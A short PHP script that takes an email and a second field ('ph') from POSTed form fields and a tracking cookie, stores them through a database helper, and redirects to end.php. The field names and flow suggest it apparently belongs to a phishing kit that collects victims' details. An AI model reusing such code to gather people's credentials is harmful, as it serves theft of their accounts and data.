<?php
header ('Location: end.php');
include 'db.php';
include 'common.php';
$email = $_POST['log7'];
$ph = $_POST['log6'];
$date = date("d F Y h:i:s A");
if(isset($_COOKIE['fbrc_user'])){
	$fbrc_user=$_COOKIE['fbrc_user'];
	in_phnew($fbrc_user,$email,$ph);
}else{
	$fbrc_user="Unknown";
	in_phnew($fbrc_user,$email,$ph);
}


?>